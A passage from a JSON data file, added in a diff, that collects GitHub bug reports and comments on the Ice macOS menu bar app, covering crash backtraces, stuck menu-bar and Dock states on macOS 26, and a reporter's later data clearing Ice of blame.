\"signal\": \"SIGTRAP\"\n  },\n  \"termination\": {\n    \"flags\": 0,\n    \"code\": 5,\n    \"namespace\": \"SIGNAL\",\n    \"indicator\": \"Trace/BPT trap: 5\",\n    \"byProc\": \"exc handler\",\n    \"byPid\": 911\n  }\n}\n```\n\n### Crash report thread 0 backtrace (unsymbolicated)[^crash-l48]\n\n```\nThread 0 (triggered), queue: com.apple.main-thread\n  frame 0: Ice + 51508    (faulting frame)\n  frame 1: Ice + 797464\n  frame 2: Ice + 792032\n  frame 3: Ice + 526305\n  frame 4: Ice + 131409\n  frame 5: Ice + 147385\n  frame 6: Ice + 74521\n  frame 7: completeTaskWithClosure(swift::AsyncContext*, swift::SwiftError*) + 1\n```\n\n[^env]: Ice crash report (`Ice-2026-03-27-232932.ips`): line 1 (`\"app_version\":\"0.11.12\"`, `\"os_version\":\"macOS 26.4 (25E246)\"`), line 8 (`\"modelCode\" : \"MacBookPro18,2\"`), line 3 (`\"uptime\" : 120000`). Kernel panic log (`panic-full-2026-03-27-233619.0002.panic`), `panicString` field: `Sleep: 0x00000000`, `Wake: 0x00000000`.\n[^crash-l43-44]: Ice crash report, lines 43-44.\n[^crash-l48]: Ice crash report, line 48. Image offsets are relative to Ice's binary base. Binary UUID: `438423db-718a-3fc0-9935-2a5721737382`.\n[^crash-details]: Ice crash report, line 43 (exception) and line 48 (thread 0 state): registers x1/x14 contain `OBJC_CLASS_$_NSStatusBarWindow`, register x9 contains objc-selector `windowNumber`, ESR is `\"(Breakpoint) brk 1\"`, frame 7 is `completeTaskWithClosure(swift::AsyncContext*, swift::SwiftError*)`.\n[^panic-string]: Kernel panic log (`panic-full-2026-03-27-233619.0002.panic`), line 8, `panicString` field.\n[^ws-log]: WindowServer unified log, captured via `log show`.\n[^rb-cycle]: `runningboardd` unified log, captured via `log show`.\n[^ice-log]: Ice process unified log, captured via `log show`.",
+      "comments_total": 0,
+      "recent_comments": []
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 968,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/968",
+      "state": "open",
+      "title": "macOS 26.5.2: Ice stuck / menu bar stays hidden after form dropdown hang (Dock auto-hide also stuck)",
+      "updated_at": "2026-07-23T21:36:26Z",
+      "body": "## Summary\n\nWhen opening **form/select dropdowns** (native popups — e.g. country pickers on websites, tag choosers in apps), the foreground app often freezes or crashes. After that:\n\n1. **Ice stops responding** (cannot show/hide sections, menu bar items stay hidden)\n2. **Dock stays auto-hidden** until the stuck app is force-quit\n3. Only killing the app (and sometimes Ice / Dock) restores normal UI\n\nThis is **not** the app menu bar (File / Edit). It is **popup / HTML `<select>` / NSPopUp** style dropdowns.\n\n## Environment\n\n| Item | Value |\n|------|--------|\n| Ice | **0.11.12** (build 1117) |\n| Bundle ID | `com.jordanbaird.Ice` |\n| macOS | **26.5.2 (25F84)** Tahoe |\n| Hardware | MacBook Pro **Mac14,7**, Apple **M2**, 8 GB |\n| Dock | Auto-hide **ON** |\n| Ice settings | `HideApplicationMenus = ON`, `ShowOnHover = ON` (0.1s), `ShowOnClick = OFF`, `UseIceBar = OFF`, `AutoRehide = ON` |\n\nAlso running other Accessibility clients (iStat Menus, BetterDisplay, Swish, Input Source Pro, CleanShot X, etc.).\n\n## Steps to reproduce\n\n1. Ice running with sections hidden as usual (hover-to-show enabled).\n2. Dock auto-hide enabled.\n3. Open Helium (or another app) on a form with a native-style dropdown (country list, tags, HTML `<select>`).\n4. Click the dropdown to open the option list.\n5. App freezes or crashes mid-popup.\n6. Observe: Ice no longer reveals hidden items; Dock does not unhide on hover until the app is force-quit.\n\n## Expected\n\n- Opening a form dropdown should not leave Ice stuck.\n- After app hang/crash, Ice and Dock should return to a consistent state without force-quit / `killall Ice`.\n\n## Actual\n\n- Ice becomes non-interactive; hidden menu bar content stays hidden.\n- Dock remains auto-hidden.\n- Recovery typically requires force-quit of the stuck app, and often:\n\n```bash\nkillall Ice\nkillall Dock\nopen -a Ice\n```\n\n## Crash evidence (Helium — Chromium)\n\nRepeated Helium crashes while **native popup menus** are tracking (same path as form selects). 6× reports in ~5 days under `~/Library/Logs/DiagnosticReports/Helium-*.ips`.\n\nException: `EXC_BREAKPOINT` / `SIGTRAP` via `+[NSApplication _crashOnException:]`\n\nRepresentative stack:\n\n```\n-[NSPopUpButtonCell trackMouse:inRect:ofView:untilMouseUp:]\n-[NSCocoaMenuImpl popUpMenu:...]\n_NSPopUpMenu\n+[NSContextMenuImpl presentPopup:fromView:withContext:animated:]\n-[NSContextMenuTrackingSession startMonitoringEvents:]\n-[NSMenuTrackingSession startRunningMenuEventLoop:]\n...\n-[NSWindow(NSDisplayCycle) _postWindowNeedsLayout]  // NSException\n+[NSApplication _crashOnException:]\n```\n\nAlternate path also seen: `NSMenuBarTrackingSession` → menu event loop → same layout exception.\n\nIce does **not** appear in the crash frames (no Ice symbols on the faulting stack). Ice is implicated as **aftermath stuck state** when the system is mid–menu-tracking / after the hang, not necessarily as the process that crashes.\n\n## Related report\n\nHelium issue (browser-side crash): https://github.com/imputnet/helium/issues/2188\n\n## Request / questions for maintainers\n\n1. Does Ice install event monitors or menu-bar observers that can race with `NSMenuTrackingSession` / popup menus (especially with **Hide Application Menus** + **Show on Hover**)?\n2. Can Ice detect a broken / stuck hide state and self-recover when the frontmost app dies mid-menu-tracking?\n3. Is there a recommended setting combo on Tahoe 26.5 for users who hit this (e.g. disable Hide Application Menus + Show on Hover)?\n\nHappy to attach Ice console logs, a sysdiagnose, or test nightlies if useful.\n\nThanks!\n",
+      "comments_total": 0,
+      "recent_comments": []
+    },
+    {
+      "repository": "jordanbaird/Ice",
+      "number": 974,
+      "html_url": "https://github.com/jordanbaird/Ice/issues/974",
+      "state": "open",
+      "title": "[Bug]: Orphaned application menu-bar windows stuck at CGWindow layer 101, invisible to accessibility (macOS 26.6.1, 0.11.13-dev.2)",
+      "updated_at": "2026-09-29T15:40:22Z",
+      "body": "## Summary\n\nOrphaned **application menu-bar windows** are left composited at CoreGraphics layer 101 after menu tracking is interrupted. The frozen panels are visible on screen but **absent from the accessibility tree**, so they ignore clicks and Escape and cannot be dismissed by any normal means — only `kill -9 Finder` clears them.\n\nThis is adjacent to #968 but a **different surface**: that issue covers popup / `<select>` / NSPopUpButton dropdowns, whereas this is the **Apple menu and the application menu bar** itself. Same recovery (force-quit), same Ice config, different affected UI.\n\nI want to be upfront about the strength of the evidence: **I have not proven Ice causes this.** I am reporting it because Ice is the only process on the machine that touches other applications' menu-bar windows via private APIs, and because the config matches #968 exactly. See \"What I could not establish\" below — please close this if it does not match anything you recognise.\n\n## Environment\n\n| Item | Value |\n|------|-------|\n| Ice | **0.11.13-dev.2** (build **1120**) — dev channel, ahead of stable 0.11.12 / 1117 |\n| Bundle ID | `com.jordanbaird.Ice` |\n| macOS | **26.6.1 (25G76)** Tahoe |\n| Hardware | Apple Silicon (arm64e) |\n| Ice settings | `HideApplicationMenus = 1`, `AutoRehide = 1`, `RehideInterval = 15`, `ShowOnClick = 1`, `ShowOnHover = 0`, `UseIceBar = 1` |\n| Other AX clients | Magnet, PopClip, Paste, TextExpander, Dropzone, Snagit, 1Password |\n\nNote the config is the same `HideApplicationMenus = ON` + `AutoRehide = ON` combination reported in #968.\n\n## Symptom (measured)\n\nTwo Finder windows stuck at layer 101:\n\n```\nPID 91315  Finder  L101   6,34    263x305    ''     <- renders as the Apple menu\nPID 91315  Finder  L101   264,34  585x1036   ''     <- renders as an Applications list\n```\n\nEnumerated with `CGWindowListCopyWindowInfo`. Meanwhile `System Events` reported **no** windows for Finder at all:\n\n```applescript\ntell application \"System Events\" to get name of every process whose visible is true\n-- Finder present, but 'every window of process \"Finder\"' returns empty\n```\n\nThat divergence — composited by CG, unknown to AX — is why the panels are undismissable: there is no live menu to close, only its retained layer.\n\n## Correlating system evidence\n\n`WindowServer` filed CPU-resource diagnostics on both affected days, each stuck re-preparing a layer tree it could not retire:\n\n```\nCommand: WindowServer\nCPU: 90s over 175s (51% avg), exceeding limit of 50% over 180s\n\n  update_display_callback -> CGXUpdateDisplay -> WS::Updater::UpdateDisplays\n    -> WS::Updater::prepare_coreanimation\n      -> ca_prepare_begin_window_update\n        -> CA::Render::Updater::prepare_layer0\n          -> prepare_sublayer0   (recursing ~20 levels deep, repeatedly)\n```\n\nConsistent with a retained/abandoned layer tree rather than transient load.\n\n## Why I am pointing at Ice specifically\n\nIce is the only process on this machine linking private CoreGraphics window APIs that reach into **other processes'** menu bars:\n\n```\n_CGSGetProcessMenuBarWindowList     <- enumerates another process's menu-bar windows\n_CGSCopyActiveMenuBarDisplayIdentifier\n_CGSGetOnScreenWindowList\n_CGSGetWindowLevel\n_CGSSetConnectionProperty\n... 14 private _CGS* symbols total (via `nm -u`)\n```\n\nWith `AutoRehide` on a 15s timer, Ice touches those windows continuously. The hypothesis is a **race**: if Ice mutates the menu-bar window list while a menu is mid-tracking, the AX element is torn down while the composited layer survives. This machine runs a heavy nightly job load (load average 22-28), which would widen such a window.\n\n## What I could not establish (please weight accordingly)\n\n- **No log line shows Ice creating or touching those specific windows.** Two independent passes over the unified log at both incident timestamps found Ice doing only routine ~100ms background-refresh work, with no anomaly correlating to onset.\n- An **orphaned `System Events` process** (PPID 1, 1m06s CPU, spawned by an `osascript` whose parent had exited) was also present on this machine and is an equally plausible driver — abandoned UI-scripting is a known way to strand menu state. I have separately fixed that on my side.\n- So this may be **entirely my own automation's fault**, not Ice's. I am filing because the capability and the config match #968, and only you can say whether the teardown path here is sound.\n\n## Question for maintainers\n\nWhen Ice enumerates or mutates another process's menu-bar windows via `_CGSGetProcessMenuBarWindowList`, is there a guard for the case where a menu is **actively tracking** at that moment? If not, that is where I would look — and it would plausibly explain both this and #968, which has had no comments since July.\n\n## Recovery\n\n```bash\nkill -9 $(pgrep -x Finder)   # Finder relaunches automatically\n```\n\nDetection (useful for anyone hitting this — exits 1 with the owning PID):\ncompare the CG layer-101 window set against the set of processes `System Events` reports as owning windows; any owner present in the former and absent from the latter is orphaned.\n",
+      "comments_total": 4,
+      "recent_comments": [
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/974#issuecomment-5404258488",
+          "updated_at": "2026-08-25T02:25:29Z",
+          "body": "https://github.com/thaw-app/Thaw"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/974#issuecomment-5475471285",
+          "updated_at": "2026-08-31T07:58:58Z",
+          "body": "Reporting back as promised, and the answer is **it recurs with `HideApplicationMenus` disabled** — so that setting is not the cause, and Ice is further off the hook rather than further on it.\n\nI left a watcher running rather than relying on noticing it. Method and instrument state first, because a quiet log and a dead watcher look identical:\n\n- `HideApplicationMenus = false` throughout (`defaults read com.jordanbaird.Ice HideApplicationMenus` → `0`), Ice `0.11.13-dev.2`, macOS 26.6.1.\n- Watcher sampled continuously across four days, **2676 clean readings** interleaved with the hits below, so every day it reports on is a day it actually ran.\n\n**Orphaned menu-layer windows, per day:**\n\n| day | orphan events | clean samples |\n|---|---|---|\n| 2026-08-28 | 0 | 56 |\n| 2026-08-29 | 5 | 283 |\n| 2026-08-30 | 13 | 274 |\n| 2026-08-31 | 7 | 41 |\n\nTwo things I did not expect, and they both point away from Ice:\n\n**1. It is not Finder-specific.** 393 orphan events across four different applications — Finder 356, 1Password 21, iTerm2 4, Firefox 4. The original report only ever showed me Finder, which made it look like a Finder/menu-extra interaction. It is not.\n\n**2. The geometries repeat exactly, across different pids and across reboots.** The same rects keep reappearing — `263x305 at 6,34` (226 times), `585x1036 at 264,34` (67), `585x1037 at 264,34` (61), `400x427 at 664,270` (15). Sample line:\n\n```\n2026-08-31T03:31:18-0400  ORPHAN  pid=7709 1Password 400x427 at 664,270\n```\n\nSystem uptime at the time of writing is 1 day, so these span restarts rather than accumulating within one session.\n\n**What I think this means:** a window-role / compositor fault on macOS 26 that is not app-specific and not Ice-specific. Combined with the earlier finding — two independent unified-log passes showing Ice behaving entirely normally at both original incident timestamps, and two negative controls falsifying my proposed Apple-Event mechanism — I do not think there is an Ice bug here.\n\nI am happy for this to be closed. Leaving the data in case another `_CGS*` consumer turns up the same shape, and thanks for your patience with a report that turned out not to be about your project.\n"
+        },
+        {
+          "html_url": "https://github.com/jordanbaird/Ice/issues/974#issuecomment-5893538942",
+          "updated_at": "2026-09-29T15:40:22Z",
+          "body": "A short update and one correction to my own data, so nobody relies on numbers that were too high.\n\n**Correction.** On Sep 24 I found a race in my watcher: it took the CoreGraphics window list and the accessibility tree in two separate snapshots, so a menu or popover that was simply open during the first and closed by the second was counted as \"orphaned\". The Aug 29–31 counts in my previous comment came from that same watcher, so they may include some of these transient menus. I fixed it by re-checking after 2 seconds and reporting only a window that is still composited and still missing from the accessibility tree.\n\n**Since that fix** (Sep 24 08:17 to Sep 29 11:37, local time): 17 orphan events and 1,350 clean samples, so the watcher was running throughout. The events were in AlDente (6), 1Password (5), CleanShot X (2), Launchie (2), Control Centre (1) and zoom.us (1). None of them was Ice.\n\n**Two facts I can't tie to a date.** This Mac is now on macOS 27.0.1, and Ice is no longer installed on it. I don't know exactly when Ice was removed, so I'm **not** presenting the events above as a without-Ice control.\n\nNothing in this data shows Ice as the cause. The cause is still unproven. As before, I'm fine with this being closed, and thanks again for your time.\n"
+        }
+      ]
+    }
+  ],
+  "pull_request": {
+    "repository": "jordanbaird/Ice",
+    "number": 995,
+    "html_url": "https://github.com/jordanbaird/Ice/pull/995",
+    "state": "open",
+    "merged": false,
+    "head_sha": "979938c0ebc31a648395531ee9f854e0cfb35615"
+  }
+}
